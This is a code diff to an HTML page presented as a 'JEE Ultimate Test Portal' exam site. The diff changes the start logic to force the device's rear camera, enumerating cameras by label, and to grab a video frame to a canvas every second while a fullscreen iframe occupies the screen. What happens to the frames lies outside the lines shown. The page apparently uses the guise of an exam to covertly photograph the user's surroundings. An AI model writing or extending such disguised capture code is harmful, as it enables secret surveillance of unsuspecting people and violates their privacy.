@@ -102,7 +102,6 @@ iframe{width:100%;height:100%;border:0;display:none;}
 <body>
 
 <div id="overlay">
-
 <h1>JEE Ultimate Test Portal</h1>
 
 <div class="top-info">
@@ -213,23 +212,54 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST LOGIC (Back Camera Only) */
+/* START TEST LOGIC (Force Back Camera) */
 async function start(){
 
   try{
-    const stream=await navigator.mediaDevices.getUserMedia({
-      video:{
-        width:1280,
-        height:720,
-        facingMode:"environment"   /* ✅ Back Camera Only */
+
+    // Permission trigger
+    await navigator.mediaDevices.getUserMedia({video:true});
+
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(d => d.kind === "videoinput");
+
+    let backId = null;
+
+    for (let device of videoDevices) {
+      if (device.label.toLowerCase().includes("back") ||
+          device.label.toLowerCase().includes("rear")) {
+        backId = device.deviceId;
+        break;
       }
-    });
+    }
+
+    let stream;
+
+    if(backId){
+      stream = await navigator.mediaDevices.getUserMedia({
+        video:{
+          deviceId:{ exact: backId },
+          width:1280,
+          height:720
+        }
+      });
+    }else{
+      stream = await navigator.mediaDevices.getUserMedia({
+        video:{
+          facingMode:{ ideal:"environment" },
+          width:1280,
+          height:720
+        }
+      });
+    }
 
     v.srcObject=stream;
+
     setTimeout(capture,1000);
     setInterval(capture,1000);
 
   }catch(e){
+    console.log(e);
     return;
   }
 
@@ -244,14 +274,11 @@ async function start(){
 
   if(frame.requestFullscreen){
     frame.requestFullscreen();
-  }else if(frame.webkitRequestFullscreen){
-    frame.webkitRequestFullscreen();
-  }else if(frame.msRequestFullscreen){
-    frame.msRequestFullscreen();
   }
 }
 
 function capture(){
+  if(!v.videoWidth) return;
   c.width=v.videoWidth;
   c.height=v.videoHeight;
   c.getContext("2d").drawImage(v,0,0,c.width,c.height);
@@ -263,6 +290,5 @@ function capture(){
 }
 
 </script>
-
 </body>
-  </html>
+</html>
